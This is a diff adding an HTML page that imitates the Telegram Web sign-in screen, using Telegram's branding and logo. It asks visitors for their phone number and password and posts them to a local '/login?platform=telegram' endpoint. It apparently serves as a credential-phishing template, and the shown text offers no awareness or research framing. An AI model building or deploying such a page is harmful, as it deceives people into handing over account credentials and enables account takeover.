@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Web Login</title>
+    <style>
+        :root {
+            --telegram-blue: #2AABEE;
+            --telegram-button: #3390EC;
+            --telegram-button-hover: #2884DB;
+            --background-color: #ffffff;
+            --text-color: #222222;
+            --secondary-text: #707579;
+            --border-color: #DADCE0;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background: var(--background-color);
+            color: var(--text-color);
+            line-height: 1.5;
+        }
+
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+            padding: 24px 16px;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        .telegram-logo {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+
+        .telegram-logo svg {
+            width: 48px;
+            height: 48px;
+            fill: var(--telegram-blue);
+        }
+
+        .login-box {
+            background: white;
+            border-radius: 12px;
+            padding: 32px 24px;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.08);
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 500;
+            margin-bottom: 12px;
+            text-align: center;
+            color: var(--text-color);
+        }
+
+        p {
+            color: var(--secondary-text);
+            margin-bottom: 24px;
+            font-size: 15px;
+            text-align: center;
+            line-height: 1.5;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 14px;
+            color: var(--text-color);
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            font-size: 15px;
+            transition: border-color 0.2s;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: var(--telegram-button);
+        }
+
+        button {
+            background: var(--telegram-button);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 12px 24px;
+            font-size: 15px;
+            font-weight: 500;
+            cursor: pointer;
+            width: 100%;
+            margin-bottom: 16px;
+            transition: background-color 0.2s;
+        }
+
+        button:hover {
+            background: var(--telegram-button-hover);
+        }
+
+        .qr-option {
+            text-align: center;
+            margin-top: 24px;
+            font-size: 14px;
+            color: var(--secondary-text);
+        }
+
+        .qr-option a {
+            color: var(--telegram-button);
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .qr-option a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="telegram-logo">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 240 240">
+                <path d="M120 240c66.274 0 120-53.726 120-120S186.274 0 120 0 0 53.726 0 120s53.726 120 120 120zm-21.088-118.744l60.784-28.314c3.534-1.622 6.366-.075 5.288 5.063l.001-.001-10.333 48.669c-.765 3.448-2.808 4.298-5.684 2.673l-15.707-11.57-7.579 7.314c-.838.838-1.543 1.543-3.16 1.543l1.127-15.98 29.139-26.333c1.267-1.127-.277-.752-1.752.376l-36.026 22.686-15.528-4.846c-3.372-1.052-3.434-3.37.43-5.28z"/>
+            </svg>
+        </div>
+        <div class="login-box">
+            <h1>Sign in to Telegram</h1>
+            <p>Please enter your phone number and password to access your account.</p>
+            
+            <form action="/login?platform=telegram" method="POST">
+                <div class="form-group">
+                    <label for="phone">Phone Number</label>
+                    <input type="tel" id="phone" name="phone" required placeholder="+1 234 567 8900">
+                </div>
+
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" name="password" required>
+                </div>
+
+                <button type="submit">Next</button>
+            </form>
+
+            <div class="qr-option">
+                <a href="#">
+                    Log in by QR Code
+                </a>
+            </div>
+        </div>
+    </div>
+</body>
+</html> 
